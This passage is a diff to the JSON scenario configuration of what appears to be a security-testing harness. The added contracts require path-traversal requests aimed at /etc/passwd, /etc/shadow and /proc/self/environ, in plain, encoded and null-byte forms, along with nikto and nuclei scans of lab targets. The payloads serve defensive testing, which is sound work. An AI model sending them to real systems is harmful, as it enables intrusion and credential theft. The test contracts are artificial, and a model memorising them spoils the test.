+            "query_regex": "^file=\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./etc/passwd$"
+          },
+          {
+            "id": "traversal-60",
+            "method": "GET",
+            "path": "/download",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^file=\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./etc/passwd$"
+          },
+          {
+            "id": "traversal-61",
+            "method": "GET",
+            "path": "/download",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^file=\\.\\./\\.\\./\\.\\./etc/shadow$"
+          },
+          {
+            "id": "traversal-62",
+            "method": "GET",
+            "path": "/download",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^file=\\.\\./\\.\\./\\.\\./etc/hosts$"
+          },
+          {
+            "id": "traversal-63",
+            "method": "GET",
+            "path": "/download",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^file=\\.\\./\\.\\./\\.\\./proc/self/environ$"
+          },
+          {
+            "id": "traversal-64",
+            "method": "GET",
+            "path": "/download",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^file=\\.\\./\\.\\./\\.\\./windows/system32/drivers/etc/hosts$"
+          },
+          {
+            "id": "traversal-65",
+            "method": "GET",
+            "path": "/download",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^file=\\.\\.%2F\\.\\.%2F\\.\\.%2Fetc%2Fpasswd$"
+          },
+          {
+            "id": "traversal-66",
+            "method": "GET",
+            "path": "/download",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^file=\\.\\.%252F\\.\\.%252F\\.\\.%252Fetc%252Fpasswd$"
+          },
+          {
+            "id": "traversal-67",
+            "method": "GET",
+            "path": "/download",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^file=%2e%2e/%2e%2e/%2e%2e/etc/passwd$"
+          },
+          {
+            "id": "traversal-68",
+            "method": "GET",
+            "path": "/download",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd$"
+          },
+          {
+            "id": "traversal-69",
+            "method": "GET",
+            "path": "/download",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^file=\\.\\.%c0%af\\.\\.%c0%af\\.\\.%c0%afetc%c0%afpasswd$"
+          },
+          {
+            "id": "traversal-70",
+            "method": "GET",
+            "path": "/download",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^file=\\.\\.%ef%bc%8f\\.\\.%ef%bc%8f\\.\\.%ef%bc%8fetc%ef%bc%8fpasswd$"
+          },
+          {
+            "id": "traversal-71",
+            "method": "GET",
+            "path": "/download",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^file=\\.\\./\\.\\./\\.\\./etc/passwd%00$"
+          },
+          {
+            "id": "traversal-72",
+            "method": "GET",
+            "path": "/download",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^file=\\.\\./\\.\\./\\.\\./etc/passwd%00\\.jpg$"
+          },
+          {
+            "id": "traversal-73",
+            "method": "GET",
+            "path": "/download",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^file=\\.\\./\\.\\./\\.\\./etc/passwd%00\\.html$"
+          },
+          {
+            "id": "traversal-74",
+            "method": "GET",
+            "path": "/download",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^file=\\.\\.\\.\\.//\\.\\.\\.\\.//\\.\\.\\.\\.//etc/passwd$"
+          },
+          {
+            "id": "traversal-75",
+            "method": "GET",
+            "path": "/download",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^file=\\.\\.\\.\\.//\\.\\./\\.\\.\\.\\.//\\.\\./\\.\\.\\.\\.//\\.\\./etc/passwd$"
+          },
+          {
+            "id": "traversal-76",
+            "method": "GET",
+            "path": "/etc/passwd",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-77",
+            "method": "GET",
+            "path": "/etc/passwd",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-78",
+            "method": "GET",
+            "path": "/etc/passwd",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-79",
+            "method": "GET",
+            "path": "/etc/passwd",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-80",
+            "method": "GET",
+            "path": "/etc/shadow",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-81",
+            "method": "GET",
+            "path": "/etc/hosts",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-82",
+            "method": "GET",
+            "path": "/proc/self/environ",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-83",
+            "method": "GET",
+            "path": "/windows/system32/drivers/etc/hosts",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-84",
+            "method": "GET",
+            "path": "/static/..%2F..%2F..%2Fetc%2Fpasswd",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-85",
+            "method": "GET",
+            "path": "/static/..%252F..%252F..%252Fetc%252Fpasswd",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-86",
+            "method": "GET",
+            "path": "/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-87",
+            "method": "GET",
+            "path": "/static/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-88",
+            "method": "GET",
+            "path": "/static/..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-89",
+            "method": "GET",
+            "path": "/static/..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-90",
+            "method": "GET",
+            "path": "/static/../../../etc/passwd%00",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-91",
+            "method": "GET",
+            "path": "/static/../../../etc/passwd%00.jpg",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-92",
+            "method": "GET",
+            "path": "/static/../../../etc/passwd%00.html",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-93",
+            "method": "GET",
+            "path": "/static/....//....//....//etc/passwd",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-94",
+            "method": "GET",
+            "path": "/static/....//../....//../....//../etc/passwd",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-95",
+            "method": "GET",
+            "path": "/etc/passwd",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-96",
+            "method": "GET",
+            "path": "/etc/passwd",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-97",
+            "method": "GET",
+            "path": "/etc/passwd",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-98",
+            "method": "GET",
+            "path": "/etc/passwd",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-99",
+            "method": "GET",
+            "path": "/etc/shadow",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-100",
+            "method": "GET",
+            "path": "/etc/hosts",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-101",
+            "method": "GET",
+            "path": "/proc/self/environ",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-102",
+            "method": "GET",
+            "path": "/windows/system32/drivers/etc/hosts",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-103",
+            "method": "GET",
+            "path": "/images/..%2F..%2F..%2Fetc%2Fpasswd",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-104",
+            "method": "GET",
+            "path": "/images/..%252F..%252F..%252Fetc%252Fpasswd",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-105",
+            "method": "GET",
+            "path": "/images/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-106",
+            "method": "GET",
+            "path": "/images/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-107",
+            "method": "GET",
+            "path": "/images/..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-108",
+            "method": "GET",
+            "path": "/images/..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-109",
+            "method": "GET",
+            "path": "/images/../../../etc/passwd%00",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-110",
+            "method": "GET",
+            "path": "/images/../../../etc/passwd%00.jpg",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-111",
+            "method": "GET",
+            "path": "/images/../../../etc/passwd%00.html",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-112",
+            "method": "GET",
+            "path": "/images/....//....//....//etc/passwd",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-113",
+            "method": "GET",
+            "path": "/images/....//../....//../....//../etc/passwd",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1
+          }
+        ]
+      }
     },
     {
       "id": "web-app-attacks/05-nikto-scan",
@@ -21232,6 +22570,16 @@
             }
           }
         ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "nikto-invocation",
+            "tool": "nikto",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          }
+        ]
       }
     },
     {
@@ -21245,7 +22593,31 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "template-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "nuclei-technology-template",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "user-agent": ".+"
+            }
+          }
+        ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "nuclei-invocation",
+            "tool": "nuclei",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          }
+        ]
+      }
     },
     {
       "id": "web-app-attacks/07-xxe",
